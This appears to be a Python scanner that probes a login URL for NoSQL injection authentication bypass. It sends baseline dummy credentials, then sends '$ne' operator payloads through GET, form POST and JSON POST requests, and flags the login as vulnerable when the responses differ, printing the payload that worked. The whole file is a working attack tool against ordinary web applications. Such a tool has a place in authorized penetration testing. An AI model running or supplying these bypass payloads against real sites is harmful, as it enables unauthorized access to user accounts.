#!/usr/bin/env python3


import requests,argparse,sys
from time import sleep

parser = argparse.ArgumentParser()
parser.add_argument("-t",help="Target URL")
parser.add_argument("-u",help="Username parameter")
parser.add_argument("-p",help="Password parameter")
parser.add_argument("-o",help="Other parameters, separated by comma")
args = parser.parse_args()


if (args.t is None) or (args.u is None) or (args.p is None):
	print("")
	print("[*] Wrong input, you have to specify -t -u -p")
	print("")
	parser.print_help()
	exit(0)
	
def get_request(data):
	global args
	response = requests.get(args.t,params=data,allow_redirects=False)
	return response.status_code , response.text , response.request.url

def post_request_json(data):
	global args
	response = requests.post(args.t,json=data,allow_redirects=False)
	return response.status_code , response.text, response.request.body
	
def post_request(data):
	global args
	response = requests.post(args.t,data=data,allow_redirects=False)
	return response.status_code , response.text, response.request.body
	
# inject an invalid credential
def template(data,test):
	data[args.u] = "dummyusername123"
	data[args.p] = "dummypassword123"
	if args.o is not None:
		others = args.o.split(',')
		for element in others:
			element = element.split('=')
			data[element[0]] = element[1]
		
	if test == 1:
		return get_request(data)
	elif test == 2:
		return post_request(data)
	else:
		return post_request_json(data)

# inject a bypass payload
def bypass(data,test):
	if test != 3:
		data[args.u+"[$ne]"] = "dummyusername123"
		data[args.p+"[$ne]"] = "dummypassword123"
	else:
		data[args.u] = {"$ne" : "dummyusername123"}
		data[args.p] = {"$ne" : "dummypassword123"}
	if args.o is not None:
		others = args.o.split(',')
		for element in others:
			element = element.split('=')
			data[element[0]] = element[1]
	if test == 1:
			return get_request(data)
	elif test == 2:
			return post_request(data)
	else:
			return post_request_json(data)

data={}
template_code = ""
bypass_code = ""
template_text = ""
bypass_code = ""
payload =""

# test GET request
print("[*] Checking for auth bypass GET request...")
data.clear()
template_code , template_text , payload= template(data,1)
data.clear()
bypass_code , bypass_text , payload = bypass(data,1)
if template_code != bypass_code:
	print("[+] Login is probably VULNERABLE to GET request auth bypass!")
	print("[!] PAYLOAD: {}\n".format(payload))
elif template_text != bypass_text:
	print("[+] Login is probably VULNERABLE to GET request auth bypass!")
	print("[!] PAYLOAD: {}\n".format(payload))
else:
	print("[-] Login is probably NOT vulnerable to GET request auth bypass...\n")
	
sleep(2)

# test normal POST request
print("[*] Checking for auth bypass POST request...")
data.clear()
template_code , template_text, payload = template(data,2)
data.clear()
bypass_code , bypass_text, payload = bypass(data,2)
if template_code != bypass_code:
	print("[+] Login is probably VULNERABLE to POST request auth bypass!")
	print("[!] PAYLOAD: {}\n".format(payload))
elif template_text != bypass_text:
	print("[+] Login is probably VULNERABLE to POST request auth bypass!")
	print("[!] PAYLOAD: {}\n".format(payload))
else:
	print("[-] Login is probably NOT vulnerable to POST request auth bypass...\n")
	
sleep(2)

# test JSON POST request
print("[*] Checking for auth bypass POST JSON request...")
data.clear()
template_code , template_text , payload = template(data,3)
data.clear()
bypass_code , bypass_text , payload = bypass(data,3)
if template_code != bypass_code:
	print("[+] Login is probably VULNERABLE to POST JSON request auth bypass!")
	print("[!] PAYLOAD: {}\n".format(payload.decode()))
elif template_text != bypass_text:
	print("[+] Login is probably VULNERABLE to POST JSON request auth bypass!")
	print("[!] PAYLOAD: {}\n".format(payload.decode()))
else:
	print("[-] Login is probably NOT vulnerable to POST JSON request auth bypass...\n")

